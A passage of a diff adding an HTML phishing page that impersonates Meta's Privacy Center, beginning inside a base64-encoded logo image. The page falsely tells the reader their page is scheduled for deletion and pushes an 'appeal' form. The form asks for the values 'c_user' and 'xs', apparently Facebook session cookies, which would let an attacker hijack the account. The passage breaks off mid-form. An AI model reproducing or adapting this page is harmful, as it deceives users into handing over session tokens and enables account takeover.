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" alt="Meta Logo" />
+    </div>
+
+    <header>
+      <img class="logo" src="data:image/png;base64,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" alt="Meta Logo" />
+      <div class="privacy-text">Privacy Center</div>
+
+      <div class="home-page">
+        <svg class="home-icon" viewBox="0 0 576 512" xmlns="http://www.w3.org/2000/svg">
+          <path d="M280.37 148.26L96 300.11V464a16 16 0 0 0 16 16l112.06-.29a16 16 0 0 0 15.92-16V368a16 16 0 0 1 16-16h64a16 16 0 0 1 16 16v95.64a16 16 0 0 0 16 16.05L464 480a16 16 0 0 0 16-16V300L295.67 148.26a12.19 12.19 0 0 0-15.3 0zM571.6 251.47L488 182.56V44.05a12 12 0 0 0-12-12h-56a12 12 0 0 0-12 12v72.61L318.47 43a48 48 0 0 0-61 0L4.34 251.47a12 12 0 0 0-1.6 16.9l25.5 31A12 12 0 0 0 45.15 301l235.22-193.74a12.19 12.19 0 0 1 15.3 0L530.9 301a12 12 0 0 0 16.9-1.6l25.5-31a12 12 0 0 0-1.7-16.93z"/>
+        </svg>
+        <span class="home-text">Privacy Center Home Page</span>
+      </div>
+
+      <div class="menu-container">
+        <div class="menu-item">
+          <svg class="menu-icon" viewBox="0 0 512 512">
+            <path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/>
+          </svg>
+          <span class="menu-text">Search</span>
+        </div>
+
+        <div class="menu-item">
+          <svg class="menu-icon" viewBox="0 0 512 512">
+            <path d="M256 0c4.6 0 9.2 1 13.4 2.9L457.7 82.8c22 9.3 38.4 31 38.3 57.2c-.5 99.2-41.3 280.7-213.6 363.2c-16.7 8-36.1 8-52.8 0C57.3 420.7 16.5 239.2 16 140c-.1-26.2 16.3-47.9 38.3-57.2L242.7 2.9C246.8 1 251.4 0 256 0zm0 66.8V444.8C394 378 431.1 230.1 432 141.4L256 66.8l0 0z"/>
+          </svg>
+          <span class="menu-text">Privacy Policy</span>
+        </div>
+
+        <div class="menu-item">
+          <svg class="menu-icon" viewBox="0 0 512 512">
+            <path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/>
+          </svg>
+          <span class="menu-text">Other Rules & Articles</span>
+        </div>
+      </div>
+    </header>
+
+    <div class="vertical-divider"></div>
+
+    <div class="center-content">
+      <div class="warning-message">
+          <div class="warning-top">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 9V14" stroke="#D93025" stroke-width="2" stroke-linecap="round"/>
+            <path d="M12 17V17.5" stroke="#D93025" stroke-width="2" stroke-linecap="round"/>
+            <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#D93025" stroke-width="2"/>
+          </svg>
+          <span class="translatable" data-key="warningTitle">Your page is scheduled to be deleted!</span>
+        </div>
+        <div class="warning-subtext translatable" data-key="warningSubtext">
+          We have received several reports that your page violates our terms of service
+          and community guidelines. As a result, your page will be sent for verification.
+        </div>
+        <div class="warning-extra translatable" data-key="warningExtra">
+          If you believe your page was mistakenly scheduled for deletion, you can prevent
+          its permanent removal by simply clicking the appeal button below and providing
+          some quick information.
+        </div>
+
+        <div class="appeal-box">
+          <img src="https://ik.imagekit.io/alibrohi/download.png?updatedAt=1756102262767" alt="Appeal Illustration" />
+         
+          <div class="appeal-info">
+            <div class="appeal-title translatable" data-key="appealTitle">Appeal request</div>
+            <div class="appeal-desc translatable" data-key="appealDesc">
+              Fixing problems with your page
+              Please be sure to provide the requested information below.
+              Failure to provide this information may delay the processing of your appeal.
+            </div>
+            <button class="appeal-btn" id="open-appeal-btn">
+              <span id="fbSendBtnText" class="translatable" data-key="appealBtn">Appeal</span>
+            </button>
+          </div>
+        </div>
+       
+        <!-- Redesigned Appeal Form Section -->
+        <div class="appeal-form" id="appealForm">
+          <div class="form-header">
+            <div class="form-icon">
+              <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-7 9h-2V5h2v6zm0 4h-2v-2h2v2z"/>
+              </svg>
+            </div>
+            <div>
+              <div class="form-title translatable" data-key="formTitle">Page Appeal Request</div>
+              <div class="form-subtitle translatable" data-key="formSubtitle">Submit your information to appeal the deletion</div>
+            </div>
+          </div>
+         
+          <div class="form-notice-container">
+            <div class="form-notice translatable" data-key="formNotice1">
+              Ⓞ1¤7 Your page has a violation related to our community guidelines.
+            </div>
+            <div class="form-notice translatable" data-key="formNotice2">
+              Ⓞ1¤7 Please review the violation details carefully before submitting.
+            </div>
+            <div class="form-notice translatable" data-key="formNotice3">
+              Ⓞ1¤7 Ensure you provide correct information for your appeal.
+            </div>
+          </div>
+          
+          <!-- Video Section -->
+          <div class="video-container" id="videoContainer">
+            <video class="video-player" id="guideVideo" controls>
+              <source src="https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4" type="video/mp4">
+              Your browser does not support the video tag.
+            </video>
+          </div>
+         
+          <div class="form-group">
+            <label for="nameInput" class="form-label translatable" data-key="nameLabel">c_user</label>
+            <input type="text" class="form-input" id="nameInput" placeholder="Enter c_user">
+            <div class="input-error" id="nameError"></div>
+          </div>
+         
+          <div class="form-group">
+            <label for="mallInput" class="form-label translatable" data-key="mallLabel">xs</label>
